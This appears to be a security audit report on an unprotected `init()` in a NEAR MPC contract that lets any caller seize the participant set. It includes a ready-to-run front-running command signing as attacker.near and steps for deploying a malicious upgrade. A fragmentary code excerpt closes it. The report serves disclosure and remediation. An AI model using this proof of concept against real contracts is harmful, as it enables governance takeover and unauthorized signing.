### Title
Unprotected `init()` Allows Any Caller to Seize Control of the MPC Participant Set Before Legitimate Initialization - (File: `crates/contract/src/lib.rs`)

---

### Summary

The `MpcContract::init()` function is decorated with `#[init]` but **not** `#[private]`. In the NEAR SDK, `#[init]` only prevents re-initialization (it panics if contract state already exists); it does **not** restrict which account may call the function. Any external account can therefore call `init()` on a freshly deployed but not-yet-initialized contract and supply an arbitrary participant set and threshold, seizing full governance control of the MPC network before the legitimate deployer can act.

---

### Finding Description

`init_running` and `migrate` — the two other initialization-class entry points — are both guarded with `#[private]`, which in the NEAR SDK restricts callers to the contract account itself:

```
// crates/contract/src/lib.rs:1976-1979
#[private]
#[init]
#[handle_result]
pub fn init_running(...)
```

```
// crates/contract/src/lib.rs:2060-2063
#[private]
#[init(ignore_state)]
#[handle_result]
pub fn migrate() -> Result<Self, Error>
```

The primary `init` function, however, carries only `#[init]` and `#[handle_result]`:

```
// crates/contract/src/lib.rs:1924-1929
#[handle_result]
#[init]
pub fn init(
    parameters: dtos::ThresholdParameters,
    init_config: Option<dtos::InitConfig>,
) -> Result<Self, Error>
```

No `env::predecessor_account_id()` check, no `env::signer_account_id()` check, and no `#[private]` guard appear anywhere inside the function body. The function accepts arbitrary `ThresholdParameters` — including a single-participant set with threshold 1 — and immediately transitions the contract into `ProtocolContractState::Running` with those parameters.

The production deployment workflow makes this exploitable in practice. Both the launch script and the documentation perform contract deployment and `init` as **separate, sequential transactions**:

```bash
# scripts/launch-localnet.sh:216
near contract call-function as-transaction mpc-contract.test.near init \
  file-args ${init_args} ...
```

```bash
# docs/localnet/localnet.md:268
near contract call-function as-transaction mpc-contract.test.near init \
  file-args /tmp/init_args.json ...
```

Between the deploy transaction and the `init` transaction there is an observable window — even on mainnet — during which any account can front-run the legitimate `init` call.

---

### Impact Explanation

An attacker who wins the race calls `init()` with:
- `participants`: a single entry pointing to an account they control
- `threshold`: 1

The contract enters `Running` state with the attacker as the sole participant. From that position the attacker can:

1. **Propose and immediately pass contract upgrades** — `propose_update` and `vote_update` both gate on `voter_or_panic()`, which checks membership in the participant set. With threshold 1 and a single participant, the attacker's single vote immediately crosses the threshold and executes `do_update`, deploying arbitrary WASM to the contract account.
2. **Permanently freeze the MPC network** — legitimate nodes are not in the participant set and cannot submit attestations, vote on domains, or respond to signing requests.
3. **Control threshold-signature issuance** — once the attacker controls the contract, they control which signing requests are accepted and which keys are registered, enabling unauthorized signature production or permanent denial of service.

This maps directly to the allowed Critical impacts: *unauthorized transaction execution / threshold signature issuance without required participant authorization* and *bypass of threshold-signature requirements*.

---

### Likelihood Explanation

- The deployment window is a single block gap between two separate NEAR transactions, which is observable on-chain by any monitoring script.
- No special privilege, leaked key, or TEE access is required — only the ability to submit a NEAR transaction.
- The attack is fully permissionless and requires no collusion.
- Production deployment scripts and documentation confirm the two-step pattern is the intended workflow.

---

### Recommendation

Add `#[private]` to `init()`, mirroring the protection already applied to `init_running` and `migrate`:

```rust
#[private]
#[handle_result]
#[init]
pub fn init(
    parameters: dtos::ThresholdParameters,
    init_config: Option<dtos::InitConfig>,
) -> Result<Self, Error> { ... }
```

In the NEAR SDK, `#[private]` enforces `predecessor_account_id == current_account_id`, meaning only the contract account itself (i.e., a transaction signed by the contract's own full-access key) can call `init`. This matches the deployment pattern already in use, where the deployer signs as `mpc-contract.test.near`.

Alternatively, batch the deploy and `init` calls into a single transaction so no uninitialized window exists.

---

### Proof of Concept

1. Operator deploys the MPC contract WASM to `mpc-contract.near` (transaction T1).
2. Before the operator submits the `init` transaction (T2), an attacker submits:

```json
near contract call-function as-transaction mpc-contract.near init \
  json-args '{
    "parameters": {
      "participants": {
        "next_id": 1,
        "participants": [
          ["attacker.near", 0, {
            "tls_public_key": "<attacker_p2p_key>",
            "url": "http://attacker.example.com"
          }]
        ]
      },
      "threshold": 1
    }
  }' \
  prepaid-gas '300.0 Tgas' attached-deposit '0 NEAR' \
  sign-as attacker.near network-config mainnet sign-with-keychain send
```

3. The contract is now in `Running` state with `attacker.near` as the sole participant and threshold 1.
4. The operator's subsequent `init` call fails with a NEAR SDK panic because state already exists.
5. The attacker calls `propose_update` (attaching the required deposit) with a malicious WASM payload, then immediately calls `vote_update` — their single vote meets threshold 1 — and the malicious contract is deployed.

    pub fn propose_update(
        &mut self,

        // Only voters can propose updates:
        let proposer = self.voter_or_panic();
        let update: Update = args.try_into()?;

        let attached = env::attached_deposit();
        let required = ProposedUpdates::required_deposit(&update);
        if attached < required {
            return Err(InvalidParameters::InsufficientDeposit {
                attached: attached.as_yoctonear(),
                required: required.as_yoctonear(),
            }
            .into());

    pub fn vote_update(&mut self, id: UpdateId) -> Result<bool, Error> {
        log!(
            "vote_update: signer={}, id={:?}",
            env::signer_account_id(),
            id,
        );

        let ProtocolContractState::Running(running_state) = &self.protocol_state else {
            env::panic_str("protocol must be in running state");
        };

        let threshold = self.threshold()?;

        let voter = self.voter_or_panic();
        if self.proposed_updates.vote(&id, voter).is_none() {
            return Err(InvalidParameters::UpdateNotFound.into());
        }

        // Filter votes to only count current participants voting for this specific update.
        // This ensures correctness even if the cleanup promise in MpcContract::vote_reshared() fails.
        let valid_votes_count = running_state
            .parameters
            .participants()
            .participants()
            .iter()
            .filter(|(account_id, _, _)| {
                self.proposed_updates
                    .vote_by_participant
                    .get(account_id)
                    .is_some_and(|voted_id| *voted_id == id)
            })
            .count();

        // Not enough votes from current participants, wait for more.
        if (valid_votes_count as u64) < threshold.value() {
            return Ok(false);
        }

        let update_gas_deposit = Gas::from_tgas(self.config.contract_upgrade_deposit_tera_gas);

        let Some(_promise) = self.proposed_updates.do_update(&id, update_gas_deposit) else {
            return Err(InvalidParameters::UpdateNotFound.into());
        };

        Ok(true)
    }
